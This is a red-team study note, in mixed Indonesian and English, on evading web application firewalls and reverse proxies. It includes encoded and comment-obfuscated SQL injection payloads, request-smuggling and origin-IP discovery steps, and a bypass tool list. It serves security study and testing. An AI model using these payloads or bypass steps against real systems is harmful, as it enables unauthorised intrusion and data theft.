---
title: Attack Perspective — WAF & Reverse Proxy (Red Team Evasion)
tags:
- attack
- red-team
- waf
- bypass
- evasion
- nginx
- cloudflare
- modsecurity
- encoding
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  - callout
---

# WAF & Reverse Proxy — Perspektif Penyerang (Evasion)

> WAF = signature-based filter. Red team bypass dengan: encoding chain, header manipulation, HTTP parameter pollution, protocol mismatch, oversize payload, chunked transfer encoding.

## 1. Attack Surface WAF/Reverse Proxy

| Komponen | Vektor | MITRE ID | Teknik | Evasion | Detection Gap |
|----------|--------|----------|--------|---------|----------------|
| **ModSecurity** | Signature bypass via encoding/whitespace | T1190 | Multiple encoding, comment bypass | Signature = pattern match → trivial bypass | CRS rule set update lag |
| **Cloudflare WAF** | Bypass via header, origin IP discovery, encoding | T1190 | Origin IP leak, header spoofing | CDN = many false positive → loose rule | Origin IP = direct access bypass WAF |
| **AWS WAF** | Rate limit bypass, size limit bypass, rule override | T1190 | Small payload chunk, HPP | Managed rule = generic → bypass with variant | AWS WAF = managed, slow update |
| **F5/Imperva** | HTTP desync, request smuggling | T1190 | H2 desync, chunked encoding | Proxy-chain mismatch = smuggle | Proxy desync audit = rare |
| **Nginx/HAProxy** | Request smuggling, header injection | T1190 | Content-Length vs Transfer-Encoding mismatch | Reverse proxy → backend interpret beda | RP inspection = header-only |
| **Rate Limiting** | Distributed request, slowloris, session rotation | T1490 | IP rotation, user-agent rotation, proxy chain | Rate limit per-IP → distributed = bypass | Rate limit = per-IP only |
| **Bot Detection** | CAPTCHA bypass, headless browser, fingerprint spoof | T1190 | Selenium, Playwright, undetected-chromedriver | Browser automation = mimic real user | Bot score = heuristic, evadable |

## 2. WAF Bypass Chain

```
Recon: Identifikasi WAF (wafw00f, Response header, error page)
 ↓
Step 1 — Encoding Bypass:
 ├── URL encoding: `' OR 1=1--` → `%27%20OR%201%3D1--`
 ├── Double encoding: `%27` → `%2527` (decoded twice by backend)
 ├── Hex encoding: `0x27` → `'` (MySQL hex literal)
 ├── Unicode: `\u0027` (JSON/REST backend)
 └── Mixed: `%27/**/OR/**/1=1--` (comment + URL encode)
 ↓
Step 2 — Whitespace/Comment Bypass:
 ├── Inline comment: `/**/` (MySQL), `--` (MSSQL), `#` (MySQL)
 ├── Newline: `%0a` (0x0a) → break WAF regex line
 ├── Tab: `%09` → WAF strip whitespace → keep SQL valid
 └── Alternative keyword: `UNION` → `UNIÓN` (unicode) or `/*!50000UNION*/` (MySQL versioned comment)
 ↓
Step 3 — Protocol Mismatch:
 ├── HTTP/2 vs HTTP/1.1 framing (desync) → WAF inspect wrong frame
 ├── Transfer-Encoding: chunked vs Content-Length → backend interpret beda
 └── HTTP request smuggling → backend process request WAF tidak inspect
 ↓
Step 4 — Origin IP Discovery:
 ├── Subdomain enum → find backend (api.internal.target.com)
 ├── crt.sh → certificate → identify origin IP
 ├── DNS history (SecurityTrails) → past A record → origin IP
 └── Direct request ke origin IP → bypass WAF entirely
 ↓
Step 5 — Payload Delivery:
 ├── Bypass WAF → deliver payload → SQLi/XSS/RCE
 ├── Origin IP → direct exploit → no WAF
 └── API endpoint → WAF rule jarang cover API path
```

## 3. SQLi WAF Bypass Examples

| Original | Bypassed | Teknik |
|----------|---------|--------|
| `' OR 1=1--` | `%27%20OR%201%3D1--` | URL encoding |
| `' OR 1=1--` | `%27/**/OR/**/1=1--` | Inline comment |
| `UNION SELECT` | `/*!50000UNION*/ /*!50000SELECT*/` | MySQL versioned comment |
| `' OR 1=1--` | `%27%20OR%201=1--%0a` | URL + newline |
| `' OR 1=1--` | `%27%20OR%201%3D1--%09` | URL + tab |
| `UNION SELECT` | `UnIoN SeLeCt` | Case variation |
| `UNION SELECT` | `UNION%0aSELECT` | Newline between keyword |
| `' OR '1'='1` | `%27%20OR%20%271%27%3D%271` | Full URL encoding |

## 4. Tool Stack WAF Bypass

| Tool | Use |
|------|-----|
| **wafw00f** | Identify WAF (fingerprint) |
| **sqlmap --tamper** | Automated WAF bypass via tamper script |
| **Burp Suite** | Manual intercept + encoding bypass |
| **CloudFlair / HatCloud** | Cloudflare origin IP discovery |
| **SecurityTrails** | DNS history → origin IP |
| **ffuf** | Fuzzing endpoint → WAF rule discovery |
| **Cloudscraper** (Python) | Cloudflare challenge bypass (Python) |

## 5. Referensi
- wafw00f — https://github.com/EnableSecurity/wafw00f
- sqlmap Tamper Scripts — https://github.com/sqlmapproject/sqlmap/tree/master/tamper
- PortSwigger HTTP Smuggling — https://portswigger.net/web-security/request-smuggling
- ModSecurity CRS — https://github.com/coreruleset/coreruleset

audited
---
